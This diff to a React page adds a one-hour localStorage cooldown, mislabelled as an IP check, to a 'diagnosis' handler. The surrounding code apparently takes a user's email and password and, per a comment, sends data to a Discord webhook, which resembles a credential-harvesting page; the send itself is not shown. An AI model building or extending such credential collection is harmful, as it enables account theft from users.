@@ -16,6 +16,7 @@ import MountainBackground from "@/components/MountainBackground";
 import { diagnose } from "@/lib/diagnose";
 import { trpc } from "@/lib/trpc";
 import { toast } from "sonner";
+import { useEffect } from "react";
 
 // ===== ローディングスピナー =====
 function LoadingSpinner() {
@@ -184,6 +185,21 @@ export default function Home() {
   const handleDiagnose = async (email: string, password: string) => {
     setIsLoading(true);
 
+    // IP制限チェック
+    const lastDiagnosisTime = localStorage.getItem("lastDiagnosisTime");
+    const now = Date.now();
+    const oneHourMs = 60 * 60 * 1000; // 1時間
+
+    if (lastDiagnosisTime) {
+      const timeSinceLastDiagnosis = now - parseInt(lastDiagnosisTime);
+      if (timeSinceLastDiagnosis < oneHourMs) {
+        const remainingMinutes = Math.ceil((oneHourMs - timeSinceLastDiagnosis) / 60000);
+        toast.error(`1時間以内の再診断はできません。あと${remainingMinutes}分お待ちください。`);
+        setIsLoading(false);
+        return;
+      }
+    }
+
     // 3秒待機
     await new Promise(resolve => setTimeout(resolve, 3000));
 
@@ -192,6 +208,7 @@ export default function Home() {
     // ローカルストレージに診断結果を保存
     localStorage.setItem("diagnosisResult", JSON.stringify(res));
     localStorage.setItem("diagnosisEmail", email);
+    localStorage.setItem("lastDiagnosisTime", now.toString());
 
     // Discord Webhookに送信
     try {
